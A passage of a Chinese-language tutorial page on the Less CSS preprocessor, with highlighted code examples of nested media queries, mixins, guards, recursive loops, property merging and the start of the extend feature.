class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    //something...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@media</span> screen&#123;</span><br><span class="line">        <span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">768px</span>)&#123;</span><br><span class="line">          <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">@media</span> tv &#123;</span><br><span class="line">      <span class="attribute">width</span>:<span class="number">2000px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">maxwidth</span>:<span class="number">768px</span>)&#123;</span><br><span class="line">  <span class="selector-id">#main</span>&#123;</span><br><span class="line">      <span class="attribute">width</span>:<span class="number">100px</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@media</span> tv&#123;</span><br><span class="line">  <span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">2000px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>唯一的缺点就是 每一个元素都会编译出自己 <code>@media</code> 声明，并不会合并。</p></li><li><p><strong>实战技巧</strong></p><p>可以借助 Less 在元素中，去定义自己的私有样式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  // something..</span><br><span class="line">  &amp;<span class="selector-class">.show</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:block;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.show</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:none;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const main = document.getElementById(&quot;main&quot;);</span><br><span class="line"><span class="selector-tag">main</span><span class="selector-class">.classList</span><span class="selector-class">.add</span>(&quot;show&quot;);</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#main</span><span class="selector-class">.show</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:block;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.show</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>:none; //会被覆盖。</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li></ol><h3 id="混合方法"><a href="#混合方法" class="headerlink" title="混合方法"></a>混合方法</h3><ol><li><p><strong>无参数方法</strong></p><p>方法犹如 声明的集合，使用时 直接键入名称即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.card</span> &#123; // 等价于 <span class="selector-class">.card</span>()</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f6f6f6</span>;</span><br><span class="line">    -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">151</span>, <span class="number">151</span>, <span class="number">151</span>, .<span class="number">58</span>);</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">151</span>, <span class="number">151</span>, <span class="number">151</span>, .<span class="number">58</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="selector-class">.card</span>;//等价于<span class="selector-class">.card</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#f6f6f6</span>;</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">151</span>, <span class="number">151</span>, <span class="number">151</span>, .<span class="number">58</span>);</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">151</span>, <span class="number">151</span>, <span class="number">151</span>, .<span class="number">58</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>其中 <code>.card</code> 与 <code>.card()</code> 是等价的。 个人建议，为了避免 代码混淆，应写成 :</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.card</span>()&#123;</span><br><span class="line">  //something...</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="selector-class">.card</span>();</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>要点：</p><ul><li><code>.</code> 与 <code>#</code> 皆可作为 方法前缀。</li><li>方法后写不写 <code>()</code> 看个人习惯。</li></ul></li><li><p><strong>默认参数方法</strong></p><ul><li>Less 可以使用默认参数，如果 没有传参数，那么将使用默认参数。</li><li><code>@arguments</code> 犹如 JS 中的 <code>arguments</code> 指代的是 全部参数。</li><li>传的参数中 必须带着单位。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">.border(@a:10px,@b:50px,@c:30px,@color:#000)&#123;</span><br><span class="line">    <span class="attribute">border</span>:solid <span class="number">1px</span> @color;</span><br><span class="line">    <span class="attribute">box-shadow</span>: @arguments;//指代的是 全部参数</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="selector-class">.border</span>(<span class="number">0px</span>,<span class="number">5px</span>,<span class="number">30px</span>,red);//必须带着单位</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">    <span class="selector-class">.border</span>(<span class="number">0px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content</span>&#123;</span><br><span class="line">  <span class="selector-class">.border</span>;//等价于 <span class="selector-class">.border</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>:solid <span class="number">1px</span> red;</span><br><span class="line">    <span class="attribute">box-shadow</span>:<span class="number">0px</span>,<span class="number">5px</span>,<span class="number">30px</span>,red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>:solid <span class="number">1px</span> <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">50px</span> <span class="number">30px</span> <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#content</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>:solid <span class="number">1px</span> <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">50px</span> <span class="number">30px</span> <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>方法的匹配模式</strong></p><p>与 面向对象中的多态 很相似</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line">.triangle(top,@width:20px,@color:#000)&#123;</span><br><span class="line">    <span class="attribute">border-color</span>:transparent  transparent @color transparent ;</span><br><span class="line">&#125;</span><br><span class="line">.triangle(right,@width:20px,@color:#000)&#123;</span><br><span class="line">    <span class="attribute">border-color</span>:transparent @color transparent  transparent ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.triangle(bottom,@width:20px,@color:#000)&#123;</span><br><span class="line">    <span class="attribute">border-color</span>:@color transparent  transparent  transparent ;</span><br><span class="line">&#125;</span><br><span class="line">.triangle(left,@width:20px,@color:#000)&#123;</span><br><span class="line">    <span class="attribute">border-color</span>:transparent  transparent  transparent @color;</span><br><span class="line">&#125;</span><br><span class="line">.triangle(@_,@width:20px,@color:#000)&#123;</span><br><span class="line">    <span class="attribute">border-style</span>: solid;</span><br><span class="line">    <span class="attribute">border-width</span>: @width;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="selector-class">.triangle</span>(<span class="attribute">left</span>, <span class="number">50px</span>, <span class="selector-id">#999</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">border-color</span>:transparent  transparent  transparent <span class="number">#999</span>;</span><br><span class="line">  <span class="attribute">border-style</span>: solid;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>要点</p><ul><li>第一个参数 <code>left</code> 要会找到方法中匹配程度最高的，如果匹配程度相同，将全部选择，并存在着样式覆盖替换。</li><li>如果匹配的参数 是变量，则将会匹配，如 <code>@_</code> 。</li></ul></li><li><p><strong>方法的命名空间</strong></p><p>让方法更加规范</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-id">#card</span>()&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#723232</span>;</span><br><span class="line">    .d(@w:300px)&#123;</span><br><span class="line">        <span class="attribute">width</span>: @w;</span><br><span class="line">        </span><br><span class="line">        #a(@h:300px)&#123;</span><br><span class="line">            <span class="attribute">height</span>: @h;//可以使用上一层传进来的方法</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">    <span class="selector-id">#card</span> &gt; <span class="selector-class">.d</span> &gt; <span class="selector-id">#a</span>(<span class="number">100px</span>); // 父元素不能加 括号</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="selector-id">#card</span> <span class="selector-class">.d</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#con</span>&#123;</span><br><span class="line">    //不得单独使用命名空间的方法</span><br><span class="line">    //<span class="selector-class">.d</span>() 如果前面没有引入命名空间 <span class="selector-id">#card</span> ，将会报错</span><br><span class="line">    </span><br><span class="line">    <span class="selector-id">#card</span>; // 等价于 <span class="selector-id">#card</span>();</span><br><span class="line">    <span class="selector-class">.d</span>(<span class="number">20px</span>); //必须先引入 <span class="selector-id">#card</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-id">#wrap</span>&#123;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#con</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>要点</p><ul><li>在 CSS 中<code>&gt;</code> 选择器，选择的是 儿子元素，就是 必须与父元素 有直接血源的元素。</li><li>在引入命令空间时，如使用 <code>&gt;</code> 选择器，父元素不能加 括号。</li><li>不得单独使用命名空间的方法 必须先引入命名空间，才能使用 其中方法。</li><li>子方法 可以使用上一层传进来的方法</li></ul></li><li><p><strong>方法的条件筛选</strong></p><p>Less 没有 if else，可是它有 <code>when</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-id">#card</span>&#123;</span><br><span class="line">    </span><br><span class="line">    // and 运算符 ，相当于 与运算 &amp;&amp;，必须条件全部符合才会执行</span><br><span class="line">    <span class="selector-class">.border</span>(<span class="keyword">@width</span>,<span class="keyword">@color</span>,<span class="keyword">@style</span>) when (@<span class="attribute">width</span>&gt;<span class="number">100px</span>) <span class="keyword">and</span>(@<span class="attribute">color</span>=#<span class="number">999</span>)&#123;</span><br><span class="line">        <span class="attribute">border</span>:@style @color @width;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // not 运算符，相当于 非运算 !，条件为 不符合才会执行</span><br><span class="line">    <span class="selector-class">.background</span>(<span class="keyword">@color</span>) when <span class="keyword">not</span> (@<span class="attribute">color</span>&gt;=#<span class="number">222</span>)&#123;</span><br><span class="line">        <span class="attribute">background</span>:@color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // , 逗号分隔符：相当于 或运算 ||，只要有一个符合条件就会执行</span><br><span class="line">    .font(@size:20px) when (@size&gt;50px) , (@size&lt;100px)&#123;</span><br><span class="line">        <span class="attribute">font-size</span>: @size;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="selector-id">#card</span>&gt;<span class="selector-class">.border</span>(<span class="number">200px</span>,<span class="selector-id">#999</span>,solid);</span><br><span class="line">    <span class="selector-id">#card</span> <span class="selector-class">.background</span>(<span class="selector-id">#111</span>);</span><br><span class="line">    <span class="selector-id">#card</span> &gt; <span class="selector-class">.font</span>(<span class="number">40px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>:solid <span class="number">#999</span> <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">background</span>:<span class="number">#111</span>;</span><br><span class="line">  <span class="attribute">font-size</span>:<span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>要点</p><ul><li>比较运算有： &gt; &gt;= = =&lt; &lt;。</li><li>= 代表的是等于</li><li>除去关键字 true 以外的值都被视为 false：</li></ul></li><li><p><strong>数量不定的参数</strong></p><p>如果你希望你的方法接受数量不定的参数，你可以使用… ，犹如 ES6 的扩展运算符。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.boxShadow</span>(...)&#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: @arguments;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.textShadow</span>(<span class="keyword">@a</span>,...)&#123;</span><br><span class="line">    <span class="attribute">text-shadow</span>: @arguments;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="selector-class">.boxShadow</span>(<span class="number">1px</span>,<span class="number">4px</span>,<span class="number">30px</span>,red);</span><br><span class="line">    <span class="selector-class">.textShadow</span>(<span class="number">1px</span>,<span class="number">4px</span>,<span class="number">30px</span>,red);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">1px</span> <span class="number">4px</span> <span class="number">30px</span> red;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">1px</span> <span class="number">4px</span> <span class="number">30px</span> red;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>方法使用important！</strong></p><p>使用方法 非常简单，在方法名后 加上关键字即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.border</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: solid <span class="number">1px</span> red;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    <span class="selector-class">.border</span>() !important;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-id">#main</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: solid <span class="number">1px</span> red <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">50px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>循环方法</strong></p><p>Less 并没有提供 for 循环功能，但这也难不倒 聪明的程序员，使用递归去实现。 下面是官网中的一个 Demo，模拟了生成栅格系统。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.generate-columns</span>(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.generate-columns</span>(<span class="keyword">@n</span>, @<span class="attribute">i</span>: <span class="number">1</span>) when (@i =&lt; @n) &#123;</span><br><span class="line">  <span class="selector-class">.column-</span>@&#123;<span class="selector-tag">i</span>&#125; &#123;</span><br><span class="line">    <span class="attribute">width</span>: (@i * <span class="number">100%</span> / @n);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-class">.generate-columns</span>(<span class="keyword">@n</span>, (@i + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-class">.column-1</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">25%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.column-2</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.column-3</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">75%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.column-4</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>属性拼接方法</strong></p><p><code>+_</code> 代表的是 空格；<code>+</code> 代表的是 逗号。</p><ul><li>逗号</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.boxShadow</span>() &#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>+: inset <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#555</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="selector-class">.boxShadow</span>();</span><br><span class="line">  <span class="attribute">box-shadow</span>+: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 生成后的 CSS */</span></span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#555</span>, <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> black;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><ul><li>空格</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.Animation</span>() &#123;</span><br><span class="line">  <span class="attribute">transform</span>+_: <span class="built_in">scale</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="selector-class">.Animation</span>();</span><br><span class="line">  <span class="attribute">transform</span>+_: <span class="built_in">rotate</span>(<span class="number">15deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">2</span>) <span class="built_in">rotate</span>(<span class="number">15deg</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li><li><p><strong>实战技巧</strong></p><p>下面是官网中的一个非常赞的 Demo</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.average</span>(<span class="keyword">@x</span>, @y) &#123;</span><br><span class="line">  @average: ((@x + @y) / 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="selector-class">.average</span>(<span class="number">16px</span>, <span class="number">50px</span>); // 调用 方法</span><br><span class="line">  <span class="attribute">padding</span>: @average;    // 使用返回值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成的 CSS */</span></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">33px</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure></li></ol><p>可以说 Less 是一门优雅编程语言。</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>extend 是 Less 的一个伪类。它可继承 所匹配声明中的全部样式。</p><ol><li><p><strong>extend 关键字的使用</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Less */</span></span><br><span class="line"><span class="selector-class">.animation</span>&#123;</span><br><span class="line">    <span class="attribute">transition</span>: all .<span class="number">3s</span> ease-out;</span><br><span class="line">    <span class="selector-class">.hide</span>&#123;</span><br><span class="line">      <span class="attribute">transform</span>:<span class="built_in">scale</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line">    &amp;:<span class="built_in">extend</span>(.animation);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#con</span>&#123;</span><br><span class="line">    &amp;:<span class="built_in">extend</span>(.animation .hide);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 